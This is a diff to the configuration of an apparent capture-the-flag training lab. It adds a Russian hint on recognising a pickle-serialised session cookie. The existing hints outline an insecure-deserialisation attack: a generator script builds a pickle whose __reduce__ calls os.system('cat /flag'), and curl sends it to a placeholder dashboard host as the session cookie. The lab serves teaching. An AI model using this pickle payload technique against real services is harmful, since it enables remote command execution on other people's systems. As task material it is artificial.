@@ -20,6 +20,7 @@ lab:
   files: [task.md, cookie.txt, gen.py]
   check: 'grep -q ''nto{'' found.txt'
   hints:
+    - "Повторение (`web-file-upload`): `base64 -d cookie.txt | xxd | head -2` — 80 04 = pickle protocol 4; определи формат перед payload."
     - 'Декодируй cookie: `base64 -d cookie.txt | xxd | head -2` — сигнатура `80 04` это pickle.'
     - 'Сгенерируй payload: `python3 gen.py` — скрипт возвращает `(os.system, (''cat /flag'',))` через `__reduce__`.'
     - 'Отправь blob серверу: `curl -s http://dashboard.example/ -b ''session=<вывод gen.py>''`.'
